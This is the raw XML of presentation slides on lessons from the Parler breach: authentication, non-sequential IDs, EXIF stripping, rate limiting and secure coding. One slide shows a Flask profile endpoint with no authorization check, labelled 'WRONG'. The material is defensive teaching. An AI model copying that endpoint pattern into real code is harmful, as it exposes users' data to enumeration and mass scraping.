                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Key Lessons from the Parler Breach</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="436483" y="7045285"/>
            <a:ext cx="6864191" cy="415528"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8802"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428863" y="7045285"/>
            <a:ext cx="30480" cy="415528"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 111719"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="547926" y="7133868"/>
            <a:ext cx="1641753" cy="132993"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Authentication is Non-Negotiable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="547926" y="7284244"/>
            <a:ext cx="6664166" cy="87987"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Every API endpoint must require proper authentication and authorization checks before returning any data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7329607" y="7045285"/>
            <a:ext cx="6864310" cy="415528"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8802"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7321987" y="7045285"/>
            <a:ext cx="30480" cy="415528"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 111719"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7441049" y="7133868"/>
            <a:ext cx="1426131" cy="132993"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Avoid Sequential IDs in URLs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7441049" y="7284244"/>
            <a:ext cx="6664285" cy="87987"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Use UUIDs or non-sequential identifiers to prevent enumeration attacks and make mass scraping more difficult</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="436483" y="7489746"/>
            <a:ext cx="6864191" cy="415528"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8802"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428863" y="7489746"/>
            <a:ext cx="30480" cy="415528"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 111719"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="547926" y="7578328"/>
            <a:ext cx="1193840" cy="132993"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Strip Sensitive Metadata</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="547926" y="7728704"/>
            <a:ext cx="6664166" cy="87987"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Remove EXIF data including GPS coordinates from user-uploaded media before storage and distribution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7329607" y="7489746"/>
            <a:ext cx="6864310" cy="415528"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8802"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7321987" y="7489746"/>
            <a:ext cx="30480" cy="415528"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 111719"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7441049" y="7578328"/>
            <a:ext cx="1231821" cy="132993"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Implement Rate Limiting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7441049" y="7728704"/>
            <a:ext cx="6664285" cy="87987"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Deploy aggressive rate limiting and anomaly detection to identify and block mass data extraction attempts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="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315200" y="0"/>
            <a:ext cx="7315200" cy="8229600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="758666" y="1111329"/>
            <a:ext cx="5797868" cy="1422797"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4450" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>9. Prevention &amp; Mitigation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="758666" y="2844879"/>
            <a:ext cx="5797868" cy="2945011"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="7700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>9.1 Secure Code Implementation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="758666" y="6100643"/>
            <a:ext cx="5797868" cy="1017627"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Implementing proper authorization checks and security best practices is essential to prevent these vulnerabilities.</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837498"/>
            <a:ext cx="7556421" cy="1488519"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4650" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Explicit Authorization Checks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6280190" y="4666178"/>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Implementing proper authorization checks is critical for API security. Never rely on implicit trust when handling user data.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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931426"/>
            <a:ext cx="8785622" cy="744260"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4650" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2. Explicit Authorization Checks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2242661"/>
            <a:ext cx="3096935" cy="372070"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WRONG:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Implicit trust</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2869882"/>
            <a:ext cx="6244709" cy="1791652"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5317"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="2869882"/>
            <a:ext cx="6267331" cy="1791652"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1899"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="3039904"/>
            <a:ext cx="5813703"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highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>@app.route('/api/profile/')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>def get_profile(user_id):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    user = User.query.get(user_id)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    return jsonify(user.to_dict())</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="4916686"/>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This code trusts that any request is authorized to access any user profile.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7436168" y="2015847"/>
            <a:ext cx="6571417" cy="5282327"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3092"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
